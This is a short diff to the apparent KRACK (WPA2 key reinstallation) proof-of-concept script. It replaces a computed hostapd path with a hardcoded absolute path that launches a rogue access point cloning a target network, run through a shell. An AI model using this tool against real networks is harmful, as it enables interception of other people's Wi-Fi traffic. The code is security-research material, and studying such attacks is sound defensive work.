@@ -604,8 +604,8 @@ class KRAckAttack():
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open(os.path.realpath(os.path.join(self.script_path, "hostapd_rogue.conf")), "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-		hostapd_path = os.path.realpath((os.path.join(self.script_path, "../hostapd/hostapd")) + ' ' + os.path.realpath(os.path.join(self.script_path, "hostapd_rogue.conf")) + " -dd" + " -K")
-		self.hostapd = subprocess.Popen(hostapd_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+		# hostapd_path = os.path.realpath((os.path.join(self.script_path, "../hostapd/hostapd")) + ' ' + os.path.realpath(os.path.join(self.script_path, "hostapd_rogue.conf")) + " -dd" + " -K")
+		self.hostapd = subprocess.Popen("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd /home/sun10/krackattacks-poc-zerokey/krackattack/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 		
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
